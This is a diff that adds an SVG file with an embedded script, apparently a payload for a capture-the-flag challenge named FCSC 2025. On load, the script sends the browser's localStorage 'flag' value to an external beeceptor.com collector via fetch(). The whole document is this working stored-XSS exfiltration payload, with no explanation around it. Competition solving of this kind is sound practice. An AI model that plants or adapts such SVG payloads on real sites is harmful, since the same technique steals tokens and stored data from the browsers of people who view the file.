@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch("https://fcsc2025lafeuille.free.beeceptor.com/flag?data=" + localStorage.flag);
+  </script>
+</svg>
